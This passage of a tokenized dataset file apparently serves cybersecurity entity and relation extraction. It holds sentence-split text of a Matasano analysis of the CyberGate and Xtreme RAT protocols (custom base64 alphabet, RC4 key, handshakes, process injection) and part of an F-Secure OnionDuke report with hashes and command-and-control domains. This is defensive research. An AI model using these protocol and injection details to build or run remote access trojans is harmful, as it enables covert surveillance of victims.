"see", "the", "following", "strings:"], ["CyberGate", "Anti-Analysis"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Both", "PEiD", "and", "Detect", "It", "Easy", "could", "not", "identify", "what", "packer", "had", "been", "used", "."], ["We", "worked", "on", "unpacking", "it", ",", "until", "we", "finally", "discovered", "a", "tool", "called"], ["ProtectionID", ".", "This", "was", "able", "to", "identify", "the", "packer", "as", "Safengine", "Licensor", ".", "From"], ["some", "basic", "research", ",", "we", "discovered", "that", "unpacking", "the", "Safengine", "Licensor", "is", "a"], ["project", "in", "itself", ".", "Due", "to", "our", "time", "constraint", ",", "we", "found", "it", "would", "be", "best", "to"], ["continue", "our", "efforts", "analyzing", "another", "RAT", "."], ["Before", "moving", "on", "though", ",", "we", "were", "able", "to", "uncover", "enough", "information", "about"], ["its", "protocol", "from", "the", "server", "stubs", "we", "created", "(which", "aren\u2019t", "packed)", "."], ["Interestingly", ",", "CyberGate", "uses", "two", "different", "schemes", "for", "communication", "."], ["Communication", "from", "the", "client", "to", "the", "server", "is", "done", "using", "a", "variant", "of"], ["base64", ".", "The", "messages", "are", "base64", "encoded", ",", "except", "instead", "of", "the"], ["canonical", "base64", "string:"], ["\u201cABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234567"], ["89+/\u201d"], ["the", "string", "used", "is"], ["\"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx"], ["yz+/\""], ["This", "is", "an", "obfuscation", "technique", "that", "is", "also", "common", "in", "enterprise"], ["software;", "because", "the", "base64", "dictionary", "has", "been", "scrambled", ",", "a", "standard"], ["base64", "decoder", "produces", "gibberish", "when", "fed", "the", "data", "."], ["The", "base64", "encoded", "messages", "end", "with", "the", "string", "\u201c###@@@\u201d", ",", "which", "when"], ["replaced", "with", "\u201c==\u201d", "and", "then", "fed", "into", "a", "base64", "decoder", "(working", "against", "the"], ["custom", "string)", ",", "produce", "cleartext", "."], ["In", "the", "other", "direction", ",", "messages", "going", "from", "the", "server", "to", "the", "client", "are", "first"], ["compressed", "using", "zlib", "(at", "a", "compression", "level", "of", "1)", ",", "and", "then", "encrypted", "with"], ["RC4", "against", "the", "following", "key:"], ["njgnjvejvorenwtrnionrionvironvrnvcg210public"], ["They", "are", "then", "prefixed", "with", "the", "string", "\u201c@@XXXXXXXXXX@@\u201d"], ["Based", "off", "of", "this", "information", ",", "we", "think", "it\u2019s", "safe", "to", "assume", "the", "private", "version"], ["will", "have", "some", "subtle", "differences", "in", "its", "communication", ".", "Most", "likely", "the", "key", "is"], ["different", ",", "but", "the", "overall", "communication", "architecture", "is", "the", "same", "."], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["CyberGate", "RC4", "Swap"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["CyberGate", "Handshake"], ["S->C", "(U):"], ["34|\\n"], ["S->C:"], ["cybergate|Y|"], ["C->S", "(U):"], ["\\x20\\r\\n"], ["S->C", "(U):"], ["\\n"], ["C->S:"], ["maininfo|cybergate|497125y5QX8qVHZ6KNoEzseP1UYFjR|"], ["S->C", "(U):"], ["\\n"], ["S->C:", "(stripping", "out", "a", "lot", "of", "null", "bytes)"], ["maininfo|"], ["CGServer_EC3E266B172", ".", "16.1.128JESSE-3AA4AD4D2/"], ["Administrator-=WindowsXPProfessionalx32(Build:2600ServicePack:"], ["3", ".", "0)*Intel(R)Core(TM)2DuoCPUP8600@2.40GHz511MBConsole"], ["v2", ".", "3.0-Public4000CyberGateServerConsole2301UnitedStates/"], ["English\"English(UnitedStates)\"05/07/2012--15:24172", ".", "16.1.1:4000"], ["|#CGServer|cybergate|console1|Yes|"], ["C->S:"], ["configuracoesdoserver|"], ["S->C", "(U):"], ["\\n"], ["S->C", "(U):"], ["89|\\n"], ["S->C:"], ["configuracoesdoserver|configuracoesdoserver|172", ".", "16.1.1:4000|"], ["#CGServer|cybergate|console1|Yes|"], ["Its", "keepalive", "looks", "like", "this:"], ["CyberGate", "Keepalive"], ["C", "->", "S", "(U):"], ["ping|S->", "C:"], ["S->C", "(U):"], ["pong|CyberGateServerConsole###10157|"], ["A", "MITM", "script", "that", "can", "decrypt", "traffic", "is", "in", "Appendix", "C", "."], ["Xtreme", "RAT"], ["Xtreme", "RAT", "was", "another", "one", "of", "the", "RATs", "used", "by", "the", "Syrian", "government", ".", "We"], ["haven\u2019t", "seen", "much", "public", "analysis", "of", "Xtreme", "RAT", ".", "The", "guys", "over", "at", "malware", ".", "lu"], ["published", "a", "simple", "article", "covering", "a", "sample", "they", "received", "in", "an", "email", ".", "Their"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["analysis", "covered", "identifying", "and", "decrypting", "config", "information", "from", "the", "stub"], ["[10]", ".", "Our", "analysis", "will", "look", "into", "the", "communication", "protocol", "of", "the", "RAT", "."], ["Before", "looking", "at", "any", "internals", ",", "we", "opted", "to", "get", "a", "feel", "for", "the", "UI", ".", "On", "the", "first"], ["run", ",", "users", "are", "prompted", "to", "enter", "a", "password", ".", "Once", "entered", ",", "the", "program", "asks"], ["users", "to", "retype", "the", "password", "to", "confirm", "it", ".", "After", "doing", "so", ",", "a", "file", "named"], ["\u201cuser", ".", "info\u201d", "is", "created", "in", "the", "same", "directory", ".", "This", "file", "is", "simply", "a", "unicode", "string"], ["of", "the", "MD5", "hash", "of", "your", "password", "."], ["Unicode", "MD5", "Hash", "of", "Password", "in"], ["So", "if", "your", "password", "is", "\u201c123\u201d", ",", "your", "user", ".", "info", "will", "contain", "the", "hash"], ["\u2018a933d13f81649bebe035dc21f4002ff1\u2019", ".", "However", ",", "when", "we", "tried", "hashing"], ["\u201c123\u201d", "we", "found", "a", "different", "result", "(the", "correct", "hash", "is"], ["\u2018202cb962ac59075b964b07152d234b70\u2019", ".", ")", "It", "turns", "out", "this", "is", "an", "issue", "that", "was"], ["introduced", "in", "Delphi", "2009", ",", "when", "the", "default", "string", "type", "switched", "from", "ANSI"], ["strings", "to", "unicode", "strings", ".", "The", "MD5", "implementation", "is", "not", "unicode", "aware", "[11]", ","], ["leading", "to", "incorrect", "hashes", "."], ["When", "creating", "a", "server", ",", "we", "tried", "to", "change", "the", "password", "from", "its", "default"], ["\u20180123456789\u2019", ".", "It", "turns", "out", "Xtreme", "RAT", "limits", "your", "password", "to", "being", "only"], ["digits", ".", "It", "also", "rejects", "any", "password", "that", "cannot", "fit", "in", "a", "32-bit", "signed", "integer", "."], ["Well", ",", "that\u2019s", "not", "making", "us", "feel", "very", "secure", "."], ["The", "public", "version", "also", "limits", "the", "user", "to", "creating", "a", "stub", "which", "can", "only"], ["connect", "to", "localhost", "on", "port", "81", ".", "It", "also", "includes", "an", "annoying", "nag", "screen"], ["notifying", "the", "user", "that", "it", "is", "the", "public", "version", ".", "However", ",", "all", "the", "functionality", "of"], ["the", "private", "version", "is", "present", ".", "In", "order", "to", "begin", "analyzing", "its", "communication", ","], ["we", "had", "to", "change", "the", "communication", "IP", ".", "First", ",", "a", "quick", "analysis", "of", "the", "server"], ["stub", "."], ["The", "Xtreme", "RAT", "Server"], ["The", "stub", "sets", "itself", "up", "using", "a", "classic", "technique", "found", "in", "basic", "malware", ".", "It", "first"], ["uses", "CreateProcess()", "to", "create", "a", "new", "process", "(named", "based", "on", "the", "default"], ["browser", ".", ")"], ["CreateProcess()", "Based", "on", "Default"], ["Next", ",", "it", "uses", "WriteProcessMemory()", "to", "copy", "code", "to", "the", "newly", "created", "process"], ["(PE", "header", "starts", "at", "0x1610000)", "."], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Copying", "Code", "to", "the", "Newly", "Created"], ["It", "finishes", "the", "setup", "by", "simply", "resuming", "the", "thread", "using", "ResumeThread()", "."], ["After", "patching", "the", "process", "to", "have", "an", "opcode", "of", "0xEBFE", ",", "which", "is", "an", "infinite"], ["loop", ",", "at", "the", "point", "where", "the", "thread", "resumes", ",", "we", "attached", "a", "debugger", "and"], ["noticed", "that", "the", "process", "begins", "packed", "with", "UPX", "."], ["Standard", "Entry", "Point"], ["Unpacking", "is", "trivial", "from", "this", "point", ".", "Locate", "the", "JMP", "following", "the", "POPAD"], ["instruction", "."], ["Standard", "JMP", "to", "OEP"], ["This", "brings", "us", "to", "our", "OEP:"], ["Original", "Entry", "Point", "for"], ["After", "patching", "the", "dump", "to", "connect", "to", "a", "different", "address", ",", "and", "removing", "the"], ["nag", "screen", ",", "we", "were", "able", "to", "start", "our", "analysis", "of", "the", "communication", "."], ["Xtreme", "RAT", "Communication"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Xtreme", "RAT", "Handshake", "Overview"], ["S->C", "(U):"], ["myversion|3", ".", "6", "Public\\r\\n"], ["C->S", "(U):"], ["\\x58\\x0d\\x0a"], ["C->S", "(U):"], ["\\xd2\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\x00\\x00\\x00\\x00"], ["C->S:"], ["maininfo", "?", "?????###?\"", "a", "?", "\"", "a", "?", "\""], ["apK8qxVwtQ7XBgCuT0bFldfRjaSLmhHPGJyirE5z2A431ZMYUe69WnDcsoNk90dd3e7e19b35baa"], ["54015d0b4a08f2d0"], ["The", "communication", "of", "Xtreme", "RAT", "begins", "with", "the", "server", "making", "a"], ["connection", "to", "the", "client", ".", "We", "then", "have", "the", "following:"], ["Xtreme", "RAT", "Identify", "Message"], ["S", "->C", "(U):"], ["myversion|3", ".", "6", "Public\\r\\n"], ["The", "client", "acknowledges", "by", "sending:"], ["Xtreme", "RAT", "ACK"], ["C", "->S", "(U):"], ["\\x58\\x0d\\x0a"], ["Communication", "continues", "with", "the", "client", "asking", "for", "info", "about", "the", "server", "."], ["Notice", "that", "before", "any", "message", "sent", ",", "the", "stub", "or", "client", "will", "first", "send", "the"], ["password", "and", "length", "of", "the", "message", "to", "come", ",", "in", "little", "endian", "format", "."], ["Annoyingly", ",", "sometimes", "it", "sends", "this", "header", "as", "its", "own", "packet", ",", "sometimes", "it"], ["comes", "prefixed", "to", "the", "actual", "content", ".", "And", "sometimes", "it", "prefixes", "the", "header"], ["with", "an", "ACK", "of", "\u201c\\x58\\x0d\\x0a\u201d", ".", "In", "this", "example", ",", "the", "password", "is", "1234", "and", "the"], ["length", "of", "the", "message", "to", "follow", "is", "166", "bytes", "."], ["Xtreme", "RAT", "Password/Length", "Message"], ["C", "->", "S:"], ["\\xd2\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\x00\\x00\\x00\\x00"], ["|->", "Password", "=", "0x4d2", "=", "1234"], ["|->Four", "bytes", "padding"], ["|->", "Length", "=", "0xa6", "=", "166"], ["|->Four", "bytes", "padding"], ["Now", "what", "follows", "is", "some", "zlib", "compressed", "data", "with", "size", "166", "bytes", ".", "Note", "that"], ["sometimes", "our", "MITM", "script", "fails", "to", "decode", "the", "zlib", "compressed", "data", ",", "for"], ["reasons", "unknown", "to", "us", ".", "After", "decompression", "we", "have", "the", "following:"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Xtreme", "RAT", "Maininfo"], ["maininfo", "?", "?????###?\"", "a", "?", "\"", "a", "?", "\""], ["apK8qxVwtQ7XBgCuT0bFldfRjaSLmhHPGJyirE5z2A431ZMYUe69WnDcsoNk90dd3e7e19b35baa"], ["54015d0b4a08f2d0"], ["Breaking", "it", "into", "its", "parts", "we", "have:"], ["Xtreme", "RAT", "Maininfo", "Dissected"], ["CMD:"], ["maininfo"], ["SEPARATOR:"], ["\\xc2\\x00\\xaa\\x00\\xc2\\x00\\xaa\\x00\\xc2\\x00\\xaa"], ["\\x00\\x23\\x00\\x23\\x00\\x23\\x00\\xe2\\x00\\x22\\x20\\x61\\x01\\xe2\\x00\\x22\\x20\\x61\\x01\\xe2\\x00\\x22\\x20"], ["\\x61\\x01"], ["RANDOM", "STRING:"], ["pK8qxVwtQ7XBgCuT0bFldfRjaSLmhHPGJyirE5z2A431ZMYUe69WnDcsoNk"], ["MD5:"], ["90dd3e7e19b35baa54015d0b4a08f2d0"], ["The", "random", "string", "is", "just", "that", ",", "a", "random", "string", "of", "length", "0x3B", "or", "59", ".", "It\u2019s"], ["generated", "using", "the", "character", "set:", "[0-9],[A-Z],[a-z]", ".", "The", "hash", "is", "the", "incorrect"], ["MD5sum", "of", "\u201cXtremeRAT\u201d", ".", "This", "will", "always", "remain", "the", "same", "(at", "least", "for", "the"], ["public", "version", "3", ".", "6)."], ["What", "follows", "is", "a", "response", "which", "contains", "some", "information", "about", "the", "system", "."], ["It", "follows", "the", "same", "protocol", "as", "before", ",", "with", "the", "password", "and", "length", "header", ","], ["and", "the", "remaining", "message", "being", "compressed", "with", "zlib", ".", "After", "this", "response", ","], ["the", "stub", "is", "now", "connected", "to", "the", "client", ",", "but", "will", "continue", "to", "send", "more", "info", ","], ["such", "as", "a", "screenshot", "of", "the", "desktop", "and", "a", "list", "of", "any", "webcams", "installed", "."], ["At", "this", "point", ",", "a", "full", "connection", "is", "established", ".", "The", "client", "will", "send", "a", "keep", "alive"], ["while", "idle", ",", "which", "looks", "like", "the", "following:"], ["Xtreme", "RAT", "Keepalive"], ["C", "->", "S:"], ["ping"], ["S", "->", "C:"], ["pong|937|Current_Window", "(Server_Name)"], ["Also", "worth", "noting", ",", "Xtreme", "has", "the", "ability", "to", "try", "to", "disguise", "its", "handshake", "as"], ["HTTP", ".", "In", "which", "case", ",", "its", "opening", "request", "will", "look", "like", "(with", "the", "default"], ["password):"], ["Xtreme", "RAT", "GET", "Request"], ["S->C", "(U):"], ["GET/1234567890", ".", "functions", "HTTP/1", ".", "1"], ["Accept:*/*Accept-Encoding:gzip", ",", "deflate"], ["User-Agent:Mozilla/4", ".", "0(compatible;MSIE7.0;WindowsNT5.1;Trident/"], ["4", ".", "0;.NETCLR1.1.4322;.NETCLR2.0.50727;.NETCLR3.0.4506.2152;.NETCLR3.5.30729;."], ["NET4", ".", "0C)"], ["Host:172", ".", "16.1.1:4000"], ["Connection:Keep-Alive"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Conclusion"], ["RATs", "represent", "an", "under-researched", "but", "highly", "active", "area", "of", "malware", "\u201cin", "the"], ["wild\u201d", ".", "With", "both", "governments", "and", "non-state", "actors", "using", "RATs", "for"], ["surveillance", ",", "knowledge", "about", "them", "carries", "increasing", "significance", ".", "A", "good"], ["understanding", "of", "their", "protocols", "is", "critical", "to", "network", "and", "system"], ["administrators", "deploying", "tools", "that", "can", "notice", "the", "presence", "of", "a", "RAT", "."], ["All", "of", "the", "RATs", "we", "analyzed", "were", "written", "in", "Delphi", ".", "This", "gave", "the", "RATs", "some"], ["resilience", "against", "classical", "security", "mistakes", "(buffer/heap", "overflows)", "that", "are"], ["much", "easier", "to", "make", "in", "a", "language", "like", "C", "or", "C++", ".", "However", ",", "we", "still", "found"], ["serious", "vulnerabilities", "in", "DarkComet", ",", "which", "was", "the", "most", "widely", "deployed", "of"], ["the", "RATs", "we", "studied", ".", "Our", "analysis", "of", "the", "communications", "should", "provide", "a"], ["solid", "foundation", "for", "other", "researchers", "interested", "in", "further", "reverse", "engineering"], ["and", "vulnerability", "research", "on", "RATs", "."], ["Some", "notable", "coincidences", "in", "behaviors", "between", "RATs", "(use", "of", "Delphi", ",", "using"], ["the", "\u201c|\u201d", "character", "as", "a", "separator", ",", "similar", "UIs", ",", "use", "of", "zlib", ",", "use", "of", "RC4", ",", "and", "other"], ["protocol", "similarities)", "may", "suggest", "shared", "code", ",", "although", "we", "do", "not", "have"], ["enough", "evidence", "to", "make", "any", "definitive", "statements", "on", "that", "subject", "."], ["Special", "thanks", "to", "John", "Villamil", "(@day6reak)", "for", "his", "guidance", "and"], ["knowledge", "on", "this", "project", ",", "and", "to", "the", "rest", "of", "the", "Matasano", "Security", "team", "!"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."]]}], [{"vertexSet": [{"old_id": "T1", "type": "Malware", "name": "OnionDuke", "sent_id": 0, "pos": []}, {"old_id": "T2", "type": "Country", "name": "Russia", "sent_id": 2, "pos": [13]}, {"old_id": "T3", "type": "MalwareFamily", "name": "MiniDuke", "sent_id": 5, "pos": [19]}, {"old_id": "T4", "type": "ExploitTargetObject", "name": "NATO", "sent_id": 6, "pos": [8]}, {"old_id": "T5", "type": "ExploitTargetObject", "name": "European government agencies", "sent_id": 6, "pos": [10, 12]}, {"old_id": "T6", "type": "Malware", "name": "MiniDuke", "sent_id": 7, "pos": [12]}, {"old_id": "T7", "type": "MalwareFamily", "name": "OnionDuke", "sent_id": 8, "pos": [7]}, {"old_id": "T8", "type": "SHA-1", "name": "a75995f94854dea8799650a2f4a97980b71199d2", "sent_id": 15, "pos": [8]}, {"old_id": "T9", "type": "Dropper", "name": "Trojan-Dropper:W32/OnionDukeA", "sent_id": 16, "pos": []}, {"old_id": "T10", "type": "Payload", "name": "Backdoor:W32/OnionDukeB", "sent_id": 22, "pos": []}, {"old_id": "T11", "type": "SHA-1", "name": "b491c14d8cfb48636f6095b7b16555e9a575d57f", "sent_id": 21, "pos": [7]}, {"old_id": "T12", "type": "MalwareFamily", "name": "OnionDuke", "sent_id": 28, "pos": [16]}, {"old_id": "T13", "type": "SHA-1", "name": "d433f281cf56015941a1c2cb87066ca62ea1db37", "sent_id": 36, "pos": [0]}, {"old_id": "T14", "type": "Malware", "name": "Backdoor:W32/OnionDukeA", "sent_id": 36, "pos": []}, {"old_id": "T15", "type": "Indicator", "name": "overpictcom", "sent_id": 37, "pos": []}, {"old_id": "T16", "type": "Indicator", "name": "overpictcom", "sent_id": 39, "pos": []}, {"old_id": "T17", "type": "Attacker", "name": "John Kasai", "sent_id": 39, "pos": []}, {"old_id": "T18", "type": "Time", "name": "2011", "sent_id": 39, "pos": [12]}, {"old_id": "T19", "type": "Attacker", "name": "John Kasai", "sent_id": 40, "pos": []}, {"old_id": "T20", "type": "Indicator", "name": "airtravelabroadcom", "sent_id": 40, "pos": []}, {"old_id": "T21", "type": "Indicator", "name": "beijingnewsblognet", "sent_id": 41, "pos": []}, {"old_id": "T22", "type": "Indicator", "name": "grouptumblercom", "sent_id": 41, "pos": []}, {"old_id": "T23", "type": "Indicator", "name": "leveldeltacom", "sent_id": 41, "pos": []}, {"old_id": "T24", "type": "Indicator", "name": "nasdaqblognet", "sent_id": 41, "pos": []}, {"old_id": "T25", "type": "Indicator", "name": "natureinhomecom", "sent_id": 41, "pos": []}, {"old_id": "T26", "type": "Indicator", "name": "nestedmailcom", "sent_id": 42, "pos": []}, {"old_id": "T27", "type": "Indicator", "name": "nostressjobcom", "sent_id": 42, "pos": []}, {"old_id": "T28", "type": "Indicator", "name": "nytunioncom", "sent_id": 42, "pos": []}, {"old_id": "T29", "type": "Indicator", "name": "oilnewsblogcom", "sent_id": 42, "pos": []}, {"old_id": "T30", "type": "Indicator", "name": "sixsquarenet", "sent_id": 42, "pos": []}, {"old_id": "T31", "type": "Indicator", "name": "ustradecompcom", "sent_id": 42, "pos": []}, {"old_id": "T32", "type": "Indicator", "name": "leveldeltacom", "sent_id": 43, "pos": []}, {"old_id": "T33", "type": "Indicator", "name": "grouptumblercom", "sent_id": 43, "pos": []}, {"old_id": "T34", "type": "MalwareFamily", "name": "MiniDuke", "sent_id": 44, "pos": [6]}, {"old_id": "T35", "type": "MalwareFamily", "name": "OnionDuke", "sent_id": 44, "pos": [13]}, {"old_id": "T36", "type": "MalwareFamily", "name": "MiniDuke", "sent_id": 45, "pos": [0]}, {"old_id": "T37", "type": "MalwareFamily", "name": "OnionDuke", "sent_id": 47, "pos": [7]}, {"old_id": "T38", "type": "MalwareFamily", "name": "MiniDuke", "sent_id": 47, "pos": [9]}, {"old_id": "T39", "type": "MalwareFamily", "name": "OnionDuke", "sent_id": 49, "pos": [0]}, {"old_id": "T40", "type": "Time", "name": "October 2013", "sent_id": 49, "pos": [13, 14]}, {"old_id": "T41", "type": "Time", "name": "February of 2014", "sent_id": 50, "pos": [10, 12]}, {"old_id": "T42", "type": "MalwareFamily", "name": "OnionDuke", "sent_id": 50, "pos": [14]}, {"old_id": "T43", "type": "MalwareFamily", "name": "OnionDuke", "sent_id": 52, "pos": [10]}, {"old_id": "T44", "type": "MalwareFamily", "name": "OnionDuke", "sent_id": 56, "pos": [12]}, {"old_id": "T45", "type": "CourseOfAction", "name": "VPNs", "sent_id": 64, "pos": [20]}, {"old_id": "T46", "type": "MD5", "name": "a75995f94854dea8799650a2f4a97980b71199d2", "sent_id": 68, "pos": [1]}, {"old_id": "T47", "type": "MD5", "name": "b491c14d8cfb48636f6095b7b16555e9a575d57f", "sent_id": 69, "pos": [1]}, {"old_id": "T48", "type": "MD5", "name": "d433f281cf56015941a1c2cb87066ca62ea1db37", "sent_id": 70, "pos": [1]}, {"old_id": "T49", "type": "Dropper", "name": "Trojan-Dropper:W32/OnionDukeA", "sent_id": 71, "pos": []}, {"old_id": "T50", "type": "Malware", "name": "Backdoor:W32/OnionDukeA", "sent_id": 71, "pos": []}, {"old_id": "T51", "type": "Malware", "name": "Backdoor:W32/OnionDukeB", "sent_id": 72, "pos": []}], "labels": [{"old_id": "R1", "r": "P16", "h": 6, "t": 8, "evidence": [8, 9, 10, 11, 12, 13, 14, 15, 16]}, {"old_id": "R2", "r": "P32", "h": 8, "t": 1, "evidence": []}, {"old_id": "R3", "r": "P21", "h": 10, "t": 8, "evidence": []}, {"old_id": "R4", "r": "P13", "h": 8, "t": 9, "evidence": [16, 17, 18, 19, 20, 21, 22]}, {"old_id": "R5", "r": "P21", "h": 12, "t": 13, "evidence": [36]}, {"old_id": "R6", "r": "P14", "h": 13, "t": 11, "evidence": []}, {"old_id": "R7", "r": "P21", "h": 14, "t": 13, "evidence": []}, {"old_id": "R8", "r": "P21", "h": 15, "t": 13, "evidence": []}, {"old_id": "R9", "r": "P23", "h": 16, "t": 13, "evidence": []}, {"old_id": "R10", "r": "P21", "h": 47, "t": 48, "evidence": [70, 71]}, {"old_id": "R11", "r": "P21", "h": 46, "t": 48, "evidence": [69, 70, 71]}, {"old_id": "R12", "r": "P21", "h": 45, "t": 48, "evidence": [68, 69, 70, 71]}, {"old_id": "R13", "r": "P16", "h": 43, "t": 48, "evidence": [56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71]}, {"old_id": "R14", "r": "P16", "h": 43, "t": 49, "evidence": [56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71]}, {"old_id": "R15", "r": "P16", "h": 43, "t": 50, "evidence": [56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72]}], "title": ["inputs/txt/201411FSecureOnionDuke"], "sents": [["OnionDuke:", "APT", "Attacks", "Via", "the", "Tor", "Network", "-", "F-Secure", "Weblog", ":"], ["News", "from", "the", "Lab"], ["Recently", ",", "research", "was", "published", "identifying", "a", "Tor", "exit", "node", ",", "located", "in", "Russia", ",", "that", "was", "consistently", "and"], ["maliciously", "modifying", "any", "uncompressed", "Windows", "executables", "downloaded", "through", "it", ".", "Naturally", "this"], ["piqued", "our", "interest", ",", "so", "we", "decided", "to", "peer", "down", "the", "rabbit", "hole", ".", "Suffice", "to", "say", ",", "the", "hole", "was", "a", "lot", "deeper"], ["than", "we", "expected", "!", "In", "fact", ",", "it", "went", "all", "the", "way", "back", "to", "the", "notorious", "Russian", "APT", "family", "MiniDuke", ",", "known"], ["to", "have", "been", "used", "in", "targeted", "attacks", "against", "NATO", "and", "European", "government", "agencies", ".", "The", "malware"], ["used", "in", "this", "case", "is", ",", "however", ",", "not", "a", "version", "of", "MiniDuke", ".", "It", "is", "instead", "a", "separate", ",", "distinct", "family", "of", "malware"], ["that", "we", "have", "since", "taken", "to", "calling", "OnionDuke", ".", "But", "lets", "start", "from", "the", "beginning", "."], ["When", "a", "user", "attempts", "to", "download", "an", "executable", "via", "the", "malicious", "Tor", "exit", "node", ",", "what", "they", "actually"], ["receive", "is", "an", "executable", "\"wrapper\"", "that", "embeds", "both", "the", "original", "executable", "and", "a", "second", ",", "malicious"], ["executable", ".", "By", "using", "a", "separate", "wrapper", ",", "the", "malicious", "actors", "are", "able", "to", "bypass", "any", "integrity", "checks", "the"], ["original", "binary", "might", "contain", ".", "Upon", "execution", ",", "the", "wrapper", "will", "proceed", "to", "write", "to", "disk", "and", "execute", "the"], ["original", "executable", ",", "thereby", "tricking", "the", "user", "into", "believing", "that", "everything", "went", "fine", ".", "However", ",", "the"], ["wrapper", "will", "also", "write", "to", "disk", "and", "execute", "the", "second", "executable", ".", "In", "all", "the", "cases", "we", "have", "observed", ",", "this"], ["malicious", "executable", "has", "been", "the", "same", "binary", "(SHA1:", "a75995f94854dea8799650a2f4a97980b71199d2", ","], ["detected", "as", "Trojan-Dropper:W32/OnionDuke", ".", "A).", "This", "executable", "is", "a", "dropper", "containing", "a", "PE"], ["resource", "that", "pretends", "to", "be", "an", "embedded", "GIF", "image", "file", ".", "In", "reality", ",", "the", "resource", "is", "actually", "an", "encrypted"], ["dynamically", "linked", "library", "(DLL)", "file", ".", "The", "dropper", "will", "proceed", "to", "decrypt", "this", "DLL", ",", "write", "it", "to", "disk", "and"], ["execute", "it", "."], ["A", "flowchart", "of", "the", "infection", "process"], ["Once", "executed", ",", "the", "DLL", "file", "(SHA1:", "b491c14d8cfb48636f6095b7b16555e9a575d57f", ",", "detected", "as"], ["Backdoor:W32/OnionDuke", ".", "B)", "will", "decrypt", "an", "embedded", "configuration", "(shown", "below)", "and", "attempt", "to"], ["connect", "to", "hardcoded", "C&C", "URLs", "specified", "in", "the", "configuration", "data", ".", "From", "these", "C&Cs", "the", "malware", "may"], ["receive", "instructions", "to", "download", "and", "execute", "additional", "malicious", "components", ".", "It", "should", "be", "noted", ",", "that"], ["we", "believe", "all", "five", "domains", "contacted", "by", "the", "malware", "are", "innocent", "websites", "compromised", "by", "the", "malware"], ["operators", ",", "not", "dedicated", "malicious", "servers", "."], ["A", "screenshot", "of", "the", "embedded", "configuration", "data"], ["Through", "our", "research", ",", "we", "have", "also", "been", "able", "to", "identify", "multiple", "other", "components", "of", "the", "OnionDuke"], ["malware", "family", ".", "We", "have", ",", "for", "instance", ",", "observed", "components", "dedicated", "to", "stealing", "login", "credentials", "from"], ["the", "victim", "machine", "and", "components", "dedicated", "to", "gathering", "further", "information", "on", "the", "compromised"], ["system", "like", "the", "presence", "of", "antivirus", "software", "or", "a", "firewall", ".", "Some", "of", "these", "components", "have", "been", "observed"], ["being", "downloaded", "and", "executed", "by", "the", "original", "backdoor", "process", "but", "for", "other", "components", ",", "we", "have", "yet", "to"], ["identify", "the", "infection", "vector", ".", "Most", "of", "these", "components", "don't", "embed", "their", "own", "C&C", "information", "but"], ["rather", "communicate", "with", "their", "controllers", "through", "the", "original", "backdoor", "process", "."], ["One", "component", ",", "however", ",", "is", "an", "interesting", "exception", ".", "This", "DLL", "file", "(SHA1"], ["d433f281cf56015941a1c2cb87066ca62ea1db37", ",", "detected", "as", "Backdoor:W32/OnionDuke", ".", "A)", "contains"], ["among", "its", "configuration", "data", "a", "different", "hardcoded", "C&C", "domain", ",", "overpict", ".", "com", "and", "also", "evidence"], ["suggesting", "that", "this", "component", "may", "abuse", "Twitter", "as", "an", "additional", "C&C", "channel", ".", "What", "makes", "the"], ["overpict", ".", "com", "domain", "interesting", ",", "is", "it", "was", "originally", "registered", "in", "2011", "with", "the", "alias", "of", "\"John", "Kasai\"", "."], ["Within", "a", "two-week", "window", ",", "\"John", "Kasai\"", "also", "registered", "the", "following", "domains:", "airtravelabroad", ".", "com,"], ["beijingnewsblog", ".", "net,", "grouptumbler", ".", "com,", "leveldelta", ".", "com,", "nasdaqblog", ".", "net,", "natureinhome", ".", "com,"], ["nestedmail", ".", "com,", "nostressjob", ".", "com,", "nytunion", ".", "com,", "oilnewsblog", ".", "com,", "sixsquare", ".", "net", "and", "ustradecomp", ".", "com."], ["This", "is", "significant", "because", "the", "domains", "leveldelta", ".", "com", "and", "grouptumbler", ".", "com", "have", "previously", "been"], ["identified", "as", "C&C", "domains", "used", "by", "MiniDuke", ".", "This", "strongly", "suggests", "that", "although", "OnionDuke", "and"], ["MiniDuke", "are", "two", "separate", "families", "of", "malware", ",", "the", "actors", "behind", "them", "are", "connected", "through", "the", "use", "of"], ["shared", "infrastructure", "."], ["A", "visualization", "of", "the", "infrastructure", "shared", "between", "OnionDuke", "and", "MiniDuke"], ["Based", "on", "compilation", "timestamps", "and", "discovery", "dates", "of", "samples", "we", "have", "observed", ",", "we", "believe", "the"], ["OnionDuke", "operators", "have", "been", "infecting", "downloaded", "executables", "at", "least", "since", "the", "end", "of", "October", "2013", "."], ["We", "also", "have", "evidence", "suggesting", "that", ",", "at", "least", "since", "February", "of", "2014", ",", "OnionDuke", "has", "not", "only", "been"], ["spread", "by", "modifying", "downloaded", "executables", "but", "also", "by", "infecting", "executables", "in", "", ".", "torrent", "files", "containing"], ["pirated", "software", ".", "However", ",", "it", "would", "seem", "that", "the", "OnionDuke", "family", "is", "much", "older", ",", "both", "based", "on", "older"], ["compilation", "timestamps", "and", "also", "on", "the", "fact", "that", "some", "of", "the", "embedded", "configuration", "data", "make"], ["reference", "to", "an", "apparent", "version", "number", "of", "4", "suggesting", "that", "at", "least", "three", "earlier", "versions", "of", "the", "family"], ["exist", "."], ["During", "our", "research", ",", "we", 